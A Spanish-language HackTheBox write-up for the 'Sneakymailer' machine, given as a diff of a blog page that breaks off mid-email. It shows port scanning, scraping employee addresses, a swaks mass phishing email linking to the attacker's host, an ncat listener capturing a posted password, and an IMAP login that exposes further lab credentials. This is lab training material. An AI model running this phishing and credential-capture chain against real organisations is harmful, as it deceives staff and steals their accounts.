@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Maquina - Sneakymailer | Firtsmiracle blog</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina - Sneakymailer | Firtsmiracle blog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina - Sneakymailer" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hoy vamos a resolver una máquina hackthebox de dificultad media, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un pypi server creando un paquete malicioso y finalmente escalaremos privilegios como el usuario root abusando de un privilegio de sudoers en pip3." />
+<meta property="og:description" content="Hoy vamos a resolver una máquina hackthebox de dificultad media, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un pypi server creando un paquete malicioso y finalmente escalaremos privilegios como el usuario root abusando de un privilegio de sudoers en pip3." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Sneakymailer" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Sneakymailer" />
+<meta property="og:site_name" content="Firtsmiracle blog" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Sneakymailer/sneaky_logo.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-08T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Sneakymailer/sneaky_logo.jpg" />
+<meta property="twitter:title" content="Maquina - Sneakymailer" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-04-08T00:00:00+00:00","datePublished":"2023-04-08T00:00:00+00:00","description":"Hoy vamos a resolver una máquina hackthebox de dificultad media, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un pypi server creando un paquete malicioso y finalmente escalaremos privilegios como el usuario root abusando de un privilegio de sudoers en pip3.","headline":"Maquina - Sneakymailer","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Sneakymailer/sneaky_logo.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Sneakymailer"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Sneakymailer"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina - Sneakymailer</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-04-08">08 Apr 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky_logo.jpg" alt="Maquina - Sneakymailer">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hoy vamos a resolver una máquina <code>hackthebox</code> de dificultad <code>media</code>, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un <code>pypi server</code> creando un paquete malicioso y finalmente escalaremos privilegios como el usuario <code>root</code> abusando de un privilegio de sudoers en <code>pip3</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Sneakymailer
+❯ ls
+ Sneakymailer
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap, content, scripts}
+}
+❯ mkt
+❯ ls
+ content   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.197
+PING 10.10.10.197 (10.10.10.197) 56(84) bytes of data.
+64 bytes from 10.10.10.197: icmp_seq=1 ttl=63 time=2582 ms
+
+--- 10.10.10.197 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2582.173/2582.173/2582.173/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>allPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:19 GMT
+Initiating SYN Stealth Scan at 21:19
+Scanning 10.10.10.197 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.197
+Discovered open port 22/tcp on 10.10.10.197
+Discovered open port 21/tcp on 10.10.10.197
+Discovered open port 25/tcp on 10.10.10.197
+Discovered open port 8080/tcp on 10.10.10.197
+Discovered open port 143/tcp on 10.10.10.197
+Discovered open port 993/tcp on 10.10.10.197
+Completed SYN Stealth Scan at 21:20, 20.33s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.197
+Host is up, received user-set (0.31s latency).
+Scanned at 2023-04-08 21:19:57 GMT for 20s
+Not shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+21/tcp   open  ftp        syn-ack ttl 63
+22/tcp   open  ssh        syn-ack ttl 63
+25/tcp   open  smtp       syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+143/tcp  open  imap       syn-ack ttl 63
+993/tcp  open  imaps      syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
+           Raw packets sent: 98589 (4.338MB) | Rcvd: 88844 (3.554MB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p21,22,25,80,143,993,8080 10.10.10.197 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:21 GMT
+Nmap scan report for 10.10.10.197
+Host is up (0.40s latency).
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
+|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
+|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+80/tcp   open  http     nginx 1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+|_http-server-header: nginx/1.14.2
+143/tcp  open  imap     Courier Imapd (released 2018)
+|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+993/tcp  open  ssl/imap Courier Imapd (released 2018)
+|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.14.2
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 78.06 seconds
+</code></pre>
+<p>Visulizamos información interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td>vsftpd 3.0.3</td>
+    </tr>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.9p1</td>
+    </tr>
+    <tr>
+      <td>25</td>
+      <td>SMTP</td>
+      <td>Postfix smtpd</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>nginx 1.14.2</td>
+    </tr>
+    <tr>
+      <td>143</td>
+      <td>IMAP</td>
+      <td>Courier Imapd</td>
+    </tr>
+    <tr>
+      <td>993</td>
+      <td>IMAP/SSL</td>
+      <td>Courier Imapd</td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td>HTTP</td>
+      <td>nginx 1.14.2</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Comenzando primeramente intentaremos conectarnos como el usuario <code>anonymous</code> por el servicio <code>ftp</code></p>
+
+<pre><code class="language-bash">❯ ftp 10.10.10.197
+Connected to 10.10.10.197.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.197:fmiracle): anonymous
+530 Permission denied.
+Login failed.
+ftp&gt;
+</code></pre>
+
+<p>Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta <code>whatweb</code> para ver el gestor de contenido de los servicios <code>http</code></p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.197
+http://10.10.10.197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.10.197], RedirectLocation[http://sneakycorp.htb], Title[301 Moved Permanently], nginx[1.14.2]
+http://sneakycorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1.14.2]
+❯ whatweb http://10.10.10.197:8080
+http://10.10.10.197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], Title[Welcome to nginx!], nginx[1.14.2]
+</code></pre>
+
+<p><code>whatweb</code> nos reporta que se esta aplicando virtual hosting, concretamente al dominio <code>http://sneakycorp.htb</code> asi que comenzemos agregandolo a nuestro <code>/etc/hosts</code></p>
+
+<pre><code class="language-bash">echo "10.10.10.197 sneakycorp.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Vamos a proceder a abrir la pagina web.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky1.PNG" alt="" /></p>
+
+<p>Podemos observar un proyecto que nos habla de pypi, pero que es <code>pypi</code></p>
+
+<blockquote>
+  <p>El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.</p>
+</blockquote>
+
+<p><img src="/assets/images/HTB/htb-writeup-Sneakymailer/sneaky2.PNG" alt="" /></p>
+
+<p>Observamos un potencial de correos filtrados de la compañia</p>
+
+<p>Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre <code>mails.txt</code></p>
+
+<pre><code class="language-bash">curl -s -X GET "http://sneakycorp.htb/team.php" | grep "sneakymailer" | html2text | xargs | tr ' ' ',' &gt; mails.txt
+❯ /bin/cat mails.txt
+tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb
+</code></pre>
+
+<p>Como antes nos reporto <code>nmap</code> el servicio <code>imap</code> se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado.</p>
+
+<p>Para eso usaremos la herramienta <code>swaks</code></p>
+
+<blockquote>
+  <p>para instalar la herramienta solo basta con hacer un apt install swaks</p>
+</blockquote>
+
+<p>Especificaremos con los comandos <code>from</code> el correo origen, <code>--to</code> la lista de correos que obtuvimos, en el <code>body</code> podemos tratar de enviar un enlace a un servidor <code>http</code> que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud.</p>
+
+<pre><code class="language-bash">❯ swaks --from fmiracle@sneakymailer.htb --to tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb --body "Entra aqui -&gt; http://10.10.16.2/test" --server 10.10.10.197
+=== Trying 10.10.10.197:25...
+=== Connected to 10.10.10.197.
+&lt;-  220 debian ESMTP Postfix (Debian/GNU)
+ -&gt; EHLO hack4u
+&lt;-  250-debian
+&lt;-  250-PIPELINING
+&lt;-  250-SIZE 10240000
+&lt;-  250-VRFY
+&lt;-  250-ETRN
+&lt;-  250-STARTTLS
+&lt;-  250-ENHANCEDSTATUSCODES
+&lt;-  250-8BITMIME
+&lt;-  250-DSN
+&lt;-  250-SMTPUTF8
+&lt;-  250 CHUNKING
+ -&gt; MAIL FROM:&lt;fmiracle@sneakymailer.htb&gt;
+&lt;-  250 2.1.0 Ok
+ -&gt; RCPT TO:&lt;tigernixon@sneakymailer.htb&gt;
+</code></pre>
+
+<p>Nos ponemos en escucha con <code>ncat</code> en el puerto <code>80</code> y recibimos una petición post.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 80
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.197.
+Ncat: Connection from 10.10.10.197:39458.
+POST /test HTTP/1.1
+Host: 10.10.16.2
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+
+firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+</code></pre>
+
+<p>Tramos la data y lo exportamos a un ficherito llamando <code>credentials.txt</code>, donde podemos ver las credenciales de el usuario <code>Paul</code></p>
+
+<pre><code class="language-bash">❯ php --interactive
+Interactive mode enabled
+
+php &gt; echo urldecode("firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt");
+firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
+
+❯ /bin/cat credentials.txt
+firstName=Paul
+lastName=Byrd
+email=paulbyrd@sneakymailer.htb
+password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
+rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
+</code></pre>
+
+<p>Ahora provaremos conectarnos con <code>telnet</code> al puerto <code>143</code> con esas credenciales.</p>
+
+<blockquote>
+  <p>Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/">https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ telnet 10.10.10.197 143
+Trying 10.10.10.197...
+Connected to 10.10.10.197.
+Escape character is '^]'.
+* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
+* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
+a1 OK LOGIN Ok.
+a2 LIST "" "*"
+* LIST (\Unmarked \HasChildren) "." "INBOX"
+* LIST (\HasNoChildren) "." "INBOX.Trash"
+* LIST (\HasNoChildren) "." "INBOX.Sent"
+* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
+* LIST (\HasNoChildren) "." "INBOX.Sent Items"
+a2 OK LIST completed
+a3 EXAMINE "INBOX.Trash"
+* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
+* OK [PERMANENTFLAGS ()] No permanent flags permitted
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 590600304] Ok
+* OK [MYRIGHTS "acdilrsw"] ACL
+a3 OK [READ-ONLY] Ok
+a4 EXAMINE "INBOX.Sent"
+* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
+* OK [PERMANENTFLAGS ()] No permanent flags permitted
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 590600538] Ok
+* OK [MYRIGHTS "acdilrsw"] ACL
+a4 OK [READ-ONLY] Ok
+a5 EXAMINE "INBOX.Deleted Items"
+* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
+* OK [PERMANENTFLAGS ()] No permanent flags permitted
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 589481592] Ok
+* OK [MYRIGHTS "acdilrsw"] ACL
+a5 OK [READ-ONLY] Ok
+a6 EXAMINE "INBOX.Sent Items"
+* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
+* OK [PERMANENTFLAGS ()] No permanent flags permitted
+* 2 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 589480766] Ok
+* OK [MYRIGHTS "acdilrsw"] ACL
+a6 OK [READ-ONLY] Ok
+</code></pre>
+
+<p>Examinado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario <code>developer</code></p>
+
+<pre><code class="language-bash">a7 FETCH 1 BODY[]
+* 1 FETCH (BODY[] {2167}
+MIME-Version: 1.0
+To: root &lt;root@debian&gt;
+From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;
+Subject: Password reset
+Date: Fri, 15 May 2020 13:03:37 -0500
+Importance: normal
+X-Priority: 3
+Content-Type: multipart/alternative;
+	boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"
+
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset="utf-8"
+
+Hello administrator, I want to change this password for the developer accou=
+nt
+
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+Please notify me when you do it=20
+
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="utf-8"
+
+&lt;html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
+hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
+fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"&gt;&lt;head&gt;&lt;meta ht=
+tp-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8"&gt;&lt;meta name=
+=3DGenerator content=3D"Microsoft Word 15 (filtered medium)"&gt;&lt;style&gt;&lt;!--
+/* Font Definitions */
+@font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+/* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0in;
+	margin-bottom:.0001pt;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+.MsoChpDefault
+	{mso-style-type:export-only;}
+@page WordSection1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.0in 1.0in 1.0in;}
+div.WordSection1
+	{page:WordSection1;}
+--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D"#954F72"&gt;&lt;div cla=
+ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=
+e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=
+p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=
